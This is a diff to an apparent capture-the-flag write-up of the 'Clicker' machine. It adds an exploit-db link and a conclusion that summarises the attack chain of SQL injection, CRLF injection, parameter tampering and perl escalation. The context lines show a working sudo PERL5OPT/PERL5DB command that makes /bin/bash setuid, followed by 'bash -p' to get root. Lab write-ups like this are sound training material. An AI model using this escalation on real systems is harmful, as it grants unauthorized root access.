@@ -353,7 +353,7 @@ It uses /bin/bash and /bin/xml_pp. Lets see what is /bin/xml_pp
 
 ![image](33.png)
 
-It is a perl binary that may be vulnerable to perl_startup Local Privilege Escalation. We have to run:
+It is a perl binary that may be vulnerable to [perl_startup Local Privilege Escalation](https://www.exploit-db.com/exploits/39702). We have to run:
 
 ```sh
 sudo PERL5OPT=-d PERL5DB='exec "chmod u+s /bin/bash"' /opt/monitor.sh
@@ -365,3 +365,13 @@ bash -p
 And rooted!
 
 ![image](34.png)
+
+## Conclusion
+
+The clicker machine is a good learning experience, demonstrating techniques like SQL and CRLF Injections, parameter pampering and perl privilege escalation.
+
+Initial access was gained via chaining SQL injections, parameter tampering and CRLF injection. This made possible to gain a foothold on the machine.
+
+The pivotal pivoting was accomplished via the exploitation of a vulnerable perl binary. 
+
+This box exemplifies the importance of thinking broadly across multiple domains like web apps, databases, scripts, authentication, and system administration, to make sure that all layers in the system are properly secured.
